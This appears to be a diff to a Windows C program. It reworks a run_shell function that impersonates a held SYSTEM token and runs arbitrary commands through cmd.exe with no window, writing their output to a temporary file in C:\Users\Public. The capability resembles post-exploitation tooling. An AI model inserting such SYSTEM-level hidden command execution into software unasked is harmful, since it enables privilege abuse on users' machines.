@@ -83,55 +83,89 @@ static char* run_shell(const char *cmd) {
     HANDLE hSysTok = (HANDLE)InterlockedCompareExchangePointer(
         (PVOID*)&g_system_token, NULL, NULL);
     if (hSysTok) {
-        HANDLE hRead = NULL, hWrite = NULL;
-        SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
-        if (!CreatePipe(&hRead, &hWrite, &sa, 0))
-            return strdup("[error: CreatePipe]");
-        SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
-        STARTUPINFOW si = {0};
-        si.cb = sizeof(si);
-        si.dwFlags = STARTF_USESTDHANDLES;
-        si.hStdOutput = hWrite;
-        si.hStdError  = hWrite;
-        PROCESS_INFORMATION pi = {0};
-        wchar_t wcmd[4096];
-        MultiByteToWideChar(CP_ACP, 0, full_cmd, -1, wcmd, 4096);
-        ImpersonateLoggedOnUser(hSysTok);
-        /* Thread is now SYSTEM → SeAssignPrimaryTokenPrivilege is held,
-           so CreateProcessAsUserW succeeds and bInheritHandles works. */
-        BOOL ok = CreateProcessAsUserW(
-            hSysTok, NULL, wcmd,
-            NULL, NULL, TRUE,      /* bInheritHandles = TRUE for pipe */
-            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-        RevertToSelf();
-        CloseHandle(hWrite);
-        if (!ok) {
-            DWORD err = GetLastError();
-            CloseHandle(hRead);
+        /* seclogon (used by CreateProcessWithTokenW) duplicates handles that are
+           explicitly listed in STARTUPINFOW.hStdOutput/hStdError into the child.
+           Create an inheritable file handle and pass it there; run the command
+           directly via "cmd.exe /c CMD" without any shell redirect in the cmdline. */
+        DWORD uid = GetCurrentProcessId() ^ GetTickCount();
+        char outFile[MAX_PATH];
+        snprintf(outFile, sizeof(outFile), "C:\\Users\\Public\\sb%08lx.out", (unsigned long)uid);
+
+        SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
+        HANDLE hFile = CreateFileA(outFile, GENERIC_WRITE,
+            FILE_SHARE_READ | FILE_SHARE_WRITE, &sa,
+            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) {
             char *e = (char*)malloc(96);
-            snprintf(e, 96, "[error: CreateProcessAsUserW %lu]", err);
+            snprintf(e, 96, "[error: CreateFile %lu]", GetLastError());
+            return e;
+        }
+
+        char cli[4224];
+        snprintf(cli, sizeof(cli), "cmd.exe /c %s", cmd);
+        wchar_t wcli[4224];
+        MultiByteToWideChar(CP_ACP, 0, cli, -1, wcli, 4224);
+
+        STARTUPINFOW si = {0};
+        si.cb       = sizeof(si);
+        si.dwFlags  = STARTF_USESTDHANDLES;
+        si.hStdInput  = NULL;
+        si.hStdOutput = hFile;
+        si.hStdError  = hFile;
+        PROCESS_INFORMATION pi = {0};
+
+        BOOL imp_ok = ImpersonateLoggedOnUser(hSysTok);
+        DWORD imp_err = GetLastError();
+        BOOL proc_ok = FALSE;
+        DWORD proc_err = 0;
+        if (imp_ok) {
+            proc_ok = CreateProcessWithTokenW(hSysTok, 0, NULL, wcli,
+                CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+            proc_err = GetLastError();
+            RevertToSelf();
+        }
+        CloseHandle(hFile);  /* parent closes its copy; child holds its own */
+
+        if (!imp_ok) {
+            DeleteFileA(outFile);
+            char *e = (char*)malloc(96);
+            snprintf(e, 96, "[error: ImpersonateLoggedOnUser %lu]", imp_err);
+            return e;
+        }
+        if (!proc_ok) {
+            DeleteFileA(outFile);
+            char *e = (char*)malloc(96);
+            snprintf(e, 96, "[error: CreateProcessWithTokenW %lu]", proc_err);
+            return e;
+        }
+
+        WaitForSingleObject(pi.hProcess, 60000);
+        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+
+        FILE *f = fopen(outFile, "rb");
+        if (!f) {
+            char *e = (char*)malloc(96);
+            snprintf(e, 96, "[error: no outfile err=%lu]", GetLastError());
             return e;
         }
         size_t cap = 4096, len = 0;
         char *buf = (char*)malloc(cap);
-        if (!buf) {
-            TerminateProcess(pi.hProcess, 1);
-            CloseHandle(hRead); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
-            return strdup("[oom]");
-        }
-        DWORD nr; char tmp[512];
-        while (ReadFile(hRead, tmp, sizeof(tmp), &nr, NULL) && nr > 0) {
-            if (len + nr + 1 >= cap) {
-                cap = (len + nr) * 2 + 1024;
-                char *nb = (char*)realloc(buf, cap);
-                if (!nb) break;
-                buf = nb;
+        if (!buf) { fclose(f); DeleteFileA(outFile); return strdup("[oom]"); }
+        {
+            DWORD nr; char tmp[512];
+            while ((nr = (DWORD)fread(tmp, 1, sizeof(tmp), f)) > 0) {
+                if (len + nr + 1 >= cap) {
+                    cap = (len + nr) * 2 + 1024;
+                    char *nb = (char*)realloc(buf, cap);
+                    if (!nb) break;
+                    buf = nb;
+                }
+                memcpy(buf + len, tmp, nr); len += nr;
             }
-            memcpy(buf + len, tmp, nr); len += nr;
+            fclose(f);
         }
         buf[len] = '\0';
-        WaitForSingleObject(pi.hProcess, 60000);
-        CloseHandle(hRead); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+        DeleteFileA(outFile);
         return buf;
     }
 
